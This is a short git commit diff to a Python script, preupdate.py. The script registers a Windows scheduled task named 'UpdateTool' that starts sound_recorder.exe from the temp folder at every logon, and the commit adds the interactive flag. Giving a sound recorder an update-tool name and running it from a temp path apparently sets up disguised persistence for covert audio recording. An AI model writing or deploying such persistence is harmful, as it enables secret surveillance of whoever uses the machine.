d5c65504daa3503ca743973eea6208c8cc600628
DanielMueller1309 <danielmueller-dm@gmx.de>
2021-04-21 09:01:14 +0200

    commit zum wechseln

--- sonstiges/sound_rec/preupdate.py
+++ sonstiges/sound_rec/preupdate.py
@@ -1,4 +1,4 @@
 import os
 tmp = os.getenv('TMP')
-os.system(r'cmd /c "schtasks /create /sc onlogon /tn UpdateTool /tr ' + tmp + r'\UpdateTool\sound_recorder.exe"')
+os.system(r'cmd /c "schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + tmp + r'\UpdateTool\sound_recorder.exe"')
 print("fertig")
